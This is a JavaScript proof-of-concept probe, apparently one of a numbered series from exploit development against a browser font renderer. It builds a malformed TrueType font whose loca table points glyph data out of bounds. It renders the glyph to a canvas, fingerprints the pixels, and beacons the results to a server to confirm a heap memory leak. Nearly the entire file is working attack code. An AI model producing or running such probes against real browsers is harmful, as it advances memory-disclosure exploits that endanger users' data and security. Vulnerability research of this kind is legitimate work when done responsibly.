// p276 - loca OOB offset sweep: do different offsets produce different glyphs?
// V260-P2 had a broken hash (always 0 for black text). This probe fixes that.
// Tests multiple loca offsets and compares ALPHA channel patterns.
// If patterns differ, each offset reads different heap data = info leak confirmed.
// Beacon prefix: V276-

(function() {
  function B(tag, body) {
    try {
      var url = '/beacon/V276-' + tag + '?t=' + Date.now();
      if (body) navigator.sendBeacon(url, String(body).substring(0, 900));
      else new Image().src = url;
    } catch(e) {}
  }

  function hex(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
  function push16(arr, val) { arr.push((val >> 8) & 0xFF, val & 0xFF); }
  function push32(arr, val) { arr.push((val >> 24) & 0xFF, (val >> 16) & 0xFF, (val >> 8) & 0xFF, val & 0xFF); }

  B('BOOT');

  function buildFont(oobOffset, fontId) {
    var T = {};

    var h = [];
    push32(h, 0x00010000); push32(h, 0x00005000);
    push32(h, 0); push32(h, 0x5F0F3CF5);
    push16(h, 0x000B); push16(h, 1000);
    for (var i = 0; i < 16; i++) h.push(0);
    push16(h, 0); push16(h, 0); push16(h, 1000); push16(h, 1000);
    push16(h, 0); push16(h, 8); push16(h, 2);
    push16(h, 1); push16(h, 0);
    T['head'] = h;

    var hh = [];
    push32(hh, 0x00010000);
    push16(hh, 800); push16(hh, (-200) & 0xFFFF); push16(hh, 0);
    push16(hh, 1000);
    for (var i = 0; i < 11; i++) push16(hh, 0);
    push16(hh, 2);
    T['hhea'] = hh;

    var mx = [];
    push32(mx, 0x00005000); push16(mx, 2);
    T['maxp'] = mx;

    var hm = [];
    push16(hm, 500); push16(hm, 0);
    push16(hm, 800); push16(hm, 0);
    T['hmtx'] = hm;

    var cm = [];
    push16(cm, 0); push16(cm, 1);
    push16(cm, 3); push16(cm, 1); push32(cm, 12);
    push16(cm, 4); push16(cm, 32); push16(cm, 0);
    push16(cm, 4); push16(cm, 4); push16(cm, 1); push16(cm, 0);
    push16(cm, 0x41); push16(cm, 0xFFFF);
    push16(cm, 0);
    push16(cm, 0x41); push16(cm, 0xFFFF);
    push16(cm, (-0x40) & 0xFFFF); push16(cm, 1);
    push16(cm, 0); push16(cm, 0);
    T['cmap'] = cm;

    var po = [];
    push32(po, 0x00030000);
    for (var i = 0; i < 7; i++) push32(po, 0);
    T['post'] = po;

    T['glyf'] = [0];

    var lo = [];
    push32(lo, 0);
    push32(lo, oobOffset);
    push32(lo, oobOffset + 64);
    T['loca'] = lo;

    var tags = ['head', 'hhea', 'maxp', 'hmtx', 'cmap', 'post', 'glyf', 'loca'];
    var nt = tags.length;
    var dirEnd = 12 + nt * 16;
    var offsets = {};
    var cur = dirEnd;
    for (var i = 0; i < nt; i++) {
      offsets[tags[i]] = cur;
      cur += T[tags[i]].length;
      cur = (cur + 3) & ~3;
    }

    var buf = new ArrayBuffer(cur);
    var u8 = new Uint8Array(buf);
    var dv = new DataView(buf);

    dv.setUint32(0, 0x00010000);
    dv.setUint16(4, nt);
    dv.setUint16(6, 128); dv.setUint16(8, 3);
    dv.setUint16(10, nt * 16 - 128);

    for (var i = 0; i < nt; i++) {
      var d = 12 + i * 16;
      var tg = tags[i];
      for (var j = 0; j < 4; j++) dv.setUint8(d + j, tg.charCodeAt(j));
      dv.setUint32(d + 4, 0);
      dv.setUint32(d + 8, offsets[tg]);
      dv.setUint32(d + 12, T[tg].length);
      for (var j = 0; j < T[tg].length; j++) u8[offsets[tg] + j] = T[tg][j];
    }

    return buf;
  }

  // Hash function using ALPHA channel (not R which is always 0 for black text)
  function alphaHash(pixels, w, h) {
    var hash = 0;
    for (var i = 0; i < pixels.length; i += 4) {
      var a = pixels[i + 3];
      if (a > 0) hash = ((hash * 31) + a) | 0;
    }
    return hash >>> 0;
  }

  // Column sum fingerprint (compact: 8 columns sampled)
  function colFingerprint(pixels, w, h) {
    var cols = [10, 20, 30, 40, 50, 60, 70, 80];
    var fp = [];
    for (var ci = 0; ci < cols.length; ci++) {
      var x = cols[ci];
      if (x >= w) continue;
      var sum = 0;
      for (var y = 0; y < h; y++) {
        sum += pixels[(y * w + x) * 4 + 3];
      }
      fp.push(sum);
    }
    return fp.join(',');
  }

  var canvas = document.createElement('canvas');
  canvas.width = 120;
  canvas.height = 80;
  var ctx = canvas.getContext('2d');

  // Test many OOB offsets
  var offsets = [
    64, 128, 192, 256, 384, 512, 768, 1024,
    1536, 2048, 3072, 4096, 6144, 8192, 12288, 16384
  ];

  var results = [];
  var hashSet = {};
  var oi = 0;

  function testOffset() {
    if (oi >= offsets.length) {
      reportResults();
      return;
    }

    var off = offsets[oi]; oi++;
    var fontBuf = buildFont(off, 'S' + off);
    var face = new FontFace('V276O' + off, fontBuf);

    face.load().then(function(lf) {
      document.fonts.add(lf);

      ctx.clearRect(0, 0, 120, 80);
      ctx.fillStyle = '#000';
      ctx.fillRect(0, 0, 120, 80);
      ctx.fillStyle = '#FFF';
      ctx.font = '48px V276O' + off;
      ctx.textBaseline = 'top';
      ctx.fillText('A', 10, 10);

      var imgData = ctx.getImageData(0, 0, 120, 80);
      var px = imgData.data;

      var h = alphaHash(px, 120, 80);
      var fp = colFingerprint(px, 120, 80);
      var pixCount = 0;
      for (var i = 0; i < px.length; i += 4) {
        if (px[i + 3] > 10) pixCount++;
      }

      var m = ctx.measureText('A');

      results.push({
        off: off,
        hash: h,
        fp: fp,
        pix: pixCount,
        w: m.width.toFixed(1),
        aba: (m.actualBoundingBoxAscent || 0).toFixed(1),
        abd: (m.actualBoundingBoxDescent || 0).toFixed(1)
      });

      hashSet[h] = (hashSet[h] || 0) + 1;

      document.fonts.delete(lf);
      setTimeout(testOffset, 50);
    }).catch(function(e) {
      B('FAIL-' + off + '-' + e.message.substring(0, 20));
      results.push({ off: off, hash: 0, fp: '', pix: 0, w: '0', aba: '0', abd: '0' });
      setTimeout(testOffset, 50);
    });
  }

  function reportResults() {
    var uniqueHashes = Object.keys(hashSet).length;
    B('UNIQUE-HASHES-' + uniqueHashes + '-OF-' + results.length);

    // Report each result
    for (var i = 0; i < results.length; i++) {
      var r = results[i];
      B('OFF-' + r.off, 'h=' + hex(r.hash) + ' px=' + r.pix + ' w=' + r.w +
        ' aba=' + r.aba + ' abd=' + r.abd);
    }

    // Report fingerprints for first 8 offsets
    for (var i = 0; i < Math.min(8, results.length); i++) {
      var r = results[i];
      B('FP-' + r.off, r.fp);
    }

    if (uniqueHashes > 1) {
      B('DIFFERENT-PATTERNS-CONFIRMED');
    } else {
      B('SAME-PATTERN-ALL-OFFSETS');
    }

    B('DONE');
  }

  testOffset();
})();
